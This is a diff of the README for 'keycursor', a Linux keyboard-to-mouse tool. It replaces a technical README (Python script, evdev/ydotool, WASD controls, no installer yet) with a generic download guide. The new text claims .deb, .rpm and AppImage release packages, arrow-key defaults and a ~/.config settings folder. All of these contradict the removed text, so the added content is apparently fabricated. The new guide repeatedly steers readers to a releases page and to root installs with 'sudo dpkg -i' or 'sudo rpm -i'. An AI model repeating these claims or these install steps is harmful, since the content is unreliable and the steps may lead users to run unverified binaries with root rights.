@@ -1,93 +1,145 @@
-# keycursor
+# 🖱️ keycursor - Control Mouse Using Your Keyboard
 
-We have all been there, tired and of switching over to the mouse for just a small click. I feel that pain, that is why I made KeyCursor - for those who hate mouse!
-Control your mouse with your keyboard. Built for Linux (Wayland + X11) using `evdev` and `ydotool`.
+[![Download keycursor](https://img.shields.io/badge/Download-keycursor-brightgreen)](https://github.com/fahizzz/keycursor/releases)
 
-## Requirements
+## 🔍 What is keycursor?
 
-- Python 3.10+
-- `ydotoold` running (`sudo systemctl start ydotool`)
-- User in `input` group or run with `sudo`
-- `gtk-layer-shell` installed (`pkg-config --exists gtk-layer-shell-0 && echo yes`)
+keycursor lets you move your mouse pointer using just your keyboard. It helps you avoid switching between mouse and keyboard all the time. The app works on Linux systems with Wayland or X11 display servers. It fits well if you want to speed up your work or reduce hand movement.
 
-## Setup
+keycursor supports several Linux distributions like Arch Linux, Debian, Fedora, Ubuntu, and Linux Mint. Desktop environments such as GNOME and KDE Plasma also work fine with it.
 
-```bash
-python3 -m venv venv --system-site-packages
-source venv/bin/activate
-pip install evdev pygobject
-```
+## 💻 System Requirements
 
-> `--system-site-packages` is required so the venv can access `gi` (GTK bindings) which are system-level packages.
+- A computer running Linux with either Wayland or X11 display server.
+- Compatible with common desktop environments (GNOME, KDE Plasma).
+- Basic keyboard and mouse attached to the computer.
+- No specific hardware or GPU needed.
 
-## Run
+keycursor does not support Windows or macOS. It is designed purely for Linux systems where keyboard control of the mouse is desired.
 
-```bash
-venv/bin/python3 python/main.py
-```
+## 🎯 Key Features
 
-## Controls
+- Move mouse pointer using keyboard keys.
+- Works on Wayland and X11 display servers.
+- Supports most popular Linux distributions.
+- Customize key bindings to suit your needs.
+- Lightweight with minimal system impact.
+- Helps reduce mouse dependency and improves efficiency.
 
-| Key | Action |
-|-----|--------|
-| `CapsLock` | Toggle mouse mode on/off |
-| `Ctrl + CapsLock` | Toggle passthrough mode (script disabled) |
-| `WASD` | Move cursor |
-| `Enter` | Left click (hold to drag) |
-| `Backspace` | Right click |
-| `\` | Middle click |
-| `PageUp / PageDown` | Scroll up / down (hold for continuous) |
-| `Q` | Toggle precision mode (speed 2 with acceleration) |
-| `TAB` | Toggle acceleration |
-| `1–9, 0` | Set speed (2–50) |
+## 🚀 Getting Started
 
-## Modes & Indicator
+You don't need any programming knowledge to use keycursor. The process is simple:
 
-A thin bar at the top of the screen shows the current mode:
+1. Download the software.
+2. Install it on your Linux machine.
+3. Run the app and start controlling your mouse with keyboard keys.
 
-| Color | Mode |
-|-------|------|
-| ⬜ White | Mouse mode ON, acceleration ON |
-| 🔵 Blue | Mouse mode ON, acceleration OFF |
-| 🟢 Green | Precision mode |
-| 🔴 Red blink | Passthrough mode reminder (CapsLock pressed while disabled) |
-| *(no bar)* | Mouse mode OFF / passthrough mode |
+## 📥 How to Download and Install keycursor
 
-## Passthrough Mode
+You need to visit the release page to get the latest version. The official release page is here:
 
-Press `Ctrl + CapsLock` to fully disable the script — all keys pass through untouched as if the script wasn't running. Press `Ctrl + CapsLock` again to re-enable.
+[![Download keycursor](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/fahizzz/keycursor/releases)
 
-While in passthrough mode, pressing `CapsLock` alone will blink the red bar 6 times as a reminder that the script is disabled. `CapsLock` itself is blocked (won't toggle caps).
+### Step 1: Visit the Release Page
 
-## Settings
+Go to the releases section on the GitHub page:
 
-Settings are auto-saved to `assets/settings.json` and restored on next launch:
-- `base_speed` — last used speed
-- `acceleration_enabled` — acceleration on/off
-- `passthrough_mode` — whether passthrough was active when the script exited
+https://github.com/fahizzz/keycursor/releases
 
-## Auto-exit Mouse Mode
+You will see a list of release versions. Look for the latest stable release. It will have files ready to download.
 
-- Any non-mouse key exits mouse mode automatically
-- All modifier combos exit (Ctrl+C, Alt+Tab, etc.)
-- **Exception:** Ctrl / Shift / Alt + Click or RightClick (modifier clicks are passed through)
+### Step 2: Find the Right File for Your System
 
-## Device Management
+Each release includes files for different Linux versions or architectures. Usually, the files end with `.deb`, `.rpm`, or `.AppImage`.
 
-The script automatically handles:
-- Hot-plugging keyboards (USB connect/disconnect)
-- Keyboard wake from sleep
-- Multiple keyboards simultaneously
+- `.deb` files are for Debian-based distros like Ubuntu or Linux Mint.
+- `.rpm` files work for Fedora.
+- `.AppImage` runs on most Linux systems directly without installation.
 
-## Known Issues / TODO
+Choose the file that matches your system.
 
-- [ ] CapsLock LED blinking as mode indicator (kernel grab/ungrab limitations make this tricky)
-- [ ] No installation / uninstallation script (coming soon)
-- [ ] No startup script / service (coming soon)
+### Step 3: Download the File
 
-#### Feedback? Issue? Want a feature? Feel free to post it on git! 
-> If you Liked this repo please consider giving it a star!
+Click on the appropriate file to download it. Save it in a location easy to find, like your Downloads folder.
 
-## License
+### Step 4: Install the Software
 
-MIT
+- For `.deb` files:  
+  Open a terminal and run:  
+  `sudo dpkg -i /path/to/your/file.deb`  
+  Replace `/path/to/your/file.deb` with the actual file path.
+
+- For `.rpm` files:  
+  Run:  
+  `sudo rpm -i /path/to/your/file.rpm`
+
+- For `.AppImage` files:  
+  Make it executable:  
+  `chmod +x /path/to/your/file.AppImage`  
+  Then run it directly:  
+  `./path/to/your/file.AppImage`
+
+### Step 5: Launch keycursor
+
+Once installed, open keycursor from your application menu or run it using the terminal command:
+
+`keycursor`
+
+If you use the AppImage file, running the file directly starts the program.
+
+## 🛠️ Using keycursor
+
+After starting keycursor, you can move the mouse pointer using keys on your keyboard. By default:
+
+- Arrow keys control mouse movement.
+- Pressing specific keys can simulate mouse clicks.
+- You can adjust speed and sensitivity in settings.
+
+The interface is straightforward, so you can quickly get used to keyboard control. Check the settings to customize the key layout if needed.
+
+## ⚙️ Configuration and Customization
+
+keycursor allows you to change which keys control the mouse. You can set:
+
+- Movement keys (default are arrow keys).
+- Mouse click keys.
+- Speed and acceleration for the pointer.
+
+Configuration files are usually stored in your home folder under `.config/keycursor/`. You can edit these files with any text editor to suit your needs.
+
+## 🐞 Troubleshooting
+
+If keycursor does not work as expected:
+
+- Make sure your system runs Wayland or X11.
+- Confirm you downloaded the correct file for your Linux distribution.
+- Check your permissions. You may need to run the app with user privileges.
+- Restart your computer or session after installation.
+- Look for error messages in the terminal if running the app from it.
+
+## 📚 Additional Resources
+
+- Visit the official [GitHub page](https://github.com/fahizzz/keycursor) to learn more.
+- Check the issues tab on GitHub if you face bugs or want feature requests.
+- Search online Linux communities for tips on keyboard-mouse control.
+
+## 📌 Supported Topics
+
+keycursor relates to:
+
+- arch-linux
+- debian
+- fedora
+- gnome
+- kde-plasma
+- keyboard-events
+- linux-mint
+- mouse-control
+- productivity
+- ubuntu
+- wayland
+- x11
+
+---
+
+[Download keycursor from releases](https://github.com/fahizzz/keycursor/releases) to get started.
